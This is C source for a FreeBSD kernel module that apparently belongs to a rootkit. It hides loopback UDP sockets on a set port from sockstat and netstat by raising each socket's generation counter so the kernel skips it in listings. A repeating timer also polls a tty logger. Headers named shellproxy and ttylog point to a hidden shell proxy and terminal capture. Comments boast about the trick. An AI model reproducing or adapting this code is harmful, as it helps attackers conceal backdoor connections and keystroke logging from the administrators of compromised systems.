#include "shellproxy.h"
#include "ehook.h"
#include "ttylog.h"
#include <netinet/in_pcb.h>
#include <netinet/udp_var.h>
// if (inp->inp_gencnt <= xig.xig_gen && cr_canseeinpcb(...) == 0) {
// kernel creates connection thing  on sockstat andntstat
//    }
// SOLUTION: make it 0 lmao

static
void proxy_attr_inpcb (struct inpcb* inp)
{
	if (inp==NULL || inp->inp_pcbinfo==NULL)
		return;

	inp->inp_gencnt = inp->inp_pcbinfo->ipi_gencnt + 0x100 + arc4random_uniform(0x100);
}

void proxy_attr_socket (struct socket* so)
{
	// incredible thug hacks here
	proxy_attr_inpcb(sotoinpcb(so));
}

void proxy_attr_socket_clear (void)
{
}

static
void proxy_attr_remote_sockets (void)
{
	struct inpcb* inp;
	u16 udp_port = htons(OUTPORT);
	u32 loopback = htonl(INADDR_LOOPBACK);

	mtx_lock(&V_udbinfo.ipi_lock);
	CK_LIST_FOREACH(inp, &V_udbinfo.ipi_listhead, inp_list) {
		if (inp->inp_inc.inc_fport==udp_port &&
		    inp->inp_inc.inc_faddr.s_addr==loopback)
			proxy_attr_inpcb(inp);
	}
	mtx_unlock(&V_udbinfo.ipi_lock);
}
static struct callout attr_callout;
static int attr_runs;
static int attr_continuous;

static
void proxy_attr_tick (void* arg)
{
	(void)arg;
	if (attr_runs > 0) {
		attr_runs--;
		CURVNET_SET_QUIET(vnet0);
		proxy_attr_remote_sockets();
		CURVNET_RESTORE();
	}
	ttylog_poll();
	if ((attr_continuous || attr_runs > 0) && !shutting_down)
		callout_reset(&attr_callout, MAX(hz/50, 1), proxy_attr_tick, NULL);
}

static
void proxy_attr_init (void)
{
	static int initialized;

	if (!initialized) {
		callout_init(&attr_callout, 1);
		initialized = 1;
	}
}

void proxy_attr_start (void)
{
	proxy_attr_init();
	attr_runs = 200;
	callout_reset(&attr_callout, MAX(hz/50, 1), proxy_attr_tick, NULL);
}

void proxy_attr_tty_start (void)
{
	proxy_attr_init();
	attr_continuous = 1;
	callout_reset(&attr_callout, MAX(hz/50, 1), proxy_attr_tick, NULL);
}

void proxy_attr_tty_stop (void)
{
	attr_continuous = 0;
}


